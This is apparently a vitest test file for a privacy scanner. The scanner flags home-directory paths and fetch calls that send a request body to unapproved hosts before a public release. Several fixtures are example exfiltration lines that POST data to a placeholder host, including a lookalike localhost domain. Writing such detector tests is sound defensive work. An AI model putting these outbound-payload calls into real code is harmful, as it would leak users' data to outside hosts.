import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { scanPublicFiles, scanPublicText } from "./public-release-privacy.js";

const sampleMacHome = ["", "Users", "fixture-owner"].join("/");
const sampleLinuxHome = ["", "home", "fixture-owner"].join("/");

describe("public-release privacy", () => {
  it.each([
    ["src/sample.ts", `const dir = "${sampleMacHome}/.cache";`, "home-path-in-source"],
    ["docs/install.md", `Open "${sampleLinuxHome}/config.json".`, "home-path-in-docs"],
    ["src/sample.ts", 'fetch("https://unapproved.example/send", { method: "POST", body: data });', "outbound-payload"],
  ])("flags %s at its source line", (file, source, rule) => {
    expect(scanPublicText(file, source)).toEqual([{ file, line: 1, rule }]);
  });

  it("checks the tracked tree", () => {
    expect(scanPublicFiles(resolve(import.meta.dirname, "../.."))).toEqual([]);
  });

  it("allows portable paths, examples, public reads, and loopback requests", () => {
    expect(
      scanPublicText("docs/install.md", "`~/config`, `/home/example/config`, `/fixture/home/sample/config`"),
    ).toEqual([]);
    expect(
      scanPublicText(
        "src/sample.ts",
        [
          '// fetch("https://unapproved.example/send", { body: data })',
          'fetch("https://public.example/source");',
          'fetch("https://public.example/source", { body: null });',
          'fetch("https://public.example/source", { body: void 0 });',
          'fetch("https://localhost:1234/local", { body: data });',
        ].join("\n"),
      ),
    ).toEqual([]);
  });

  it("flags direct global fetch and verifies the actual host", () => {
    const file = "src/sample.ts";
    const source = '\n globalThis.fetch("https://localhost.unapproved.example/send", { body: data });';
    expect(scanPublicText(file, source)).toEqual([{ file, line: 2, rule: "outbound-payload" }]);
  });

  it("flags an unresolved body even when its binding is named undefined", () => {
    const file = "src/sample.ts";
    const source = 'function publish(undefined) { fetch("https://unapproved.example/send", { body: undefined }); }';
    expect(scanPublicText(file, source)).toEqual([{ file, line: 1, rule: "outbound-payload" }]);
  });

  it("flags Windows home paths in source and file URLs in docs", () => {
    expect(scanPublicText("bin/setup.ps.sh", 'echo "C:\\Users\\fixture-owner\\tool"')).toEqual([
      { file: "bin/setup.ps.sh", line: 1, rule: "home-path-in-source" },
    ]);
    expect(scanPublicText("docs/install.md", `Browse file://${sampleMacHome}/dir.`)).toEqual([
      { file: "docs/install.md", line: 1, rule: "home-path-in-docs" },
    ]);
  });

  it("skips synthetic fixture files and reports no matching content", () => {
    const source = `const dir = "${sampleMacHome}/.cache";`;
    expect(scanPublicText("src/sample.test.ts", source)).toEqual([]);
    expect(JSON.stringify(scanPublicText("src/sample.ts", source))).not.toContain("fixture-owner");
  });
});
